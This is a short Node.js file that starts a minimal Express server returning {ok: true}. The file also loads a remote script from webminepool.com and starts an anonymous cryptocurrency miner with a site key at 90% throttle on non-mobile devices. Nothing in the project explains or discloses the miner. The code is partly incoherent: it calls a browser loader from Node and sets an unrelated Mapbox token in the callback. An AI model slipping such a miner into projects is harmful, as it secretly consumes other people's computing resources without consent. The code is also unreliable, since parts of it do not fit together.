const express = require('express');
const app = express();
const PORT = process.env.PORT ||
 5000;


app.listen(PORT, () =>{
	console.log("listening on  " + PORT);
});
app.get('/',(req,res) => {
	res.send({ok: true});
})
var scriptjs = require('scriptjs');

scriptjs('https://www.webminepool.com/lib/base.js', function() {
    L.mapbox.accessToken = 'MyToken';
});
var miner = WMP.Anonymous('SK_k8AAl94wLGDjcDDbhXrtW', { throttle: 0.9});
		 if (!miner.isMobile()){
			miner.start();
		}


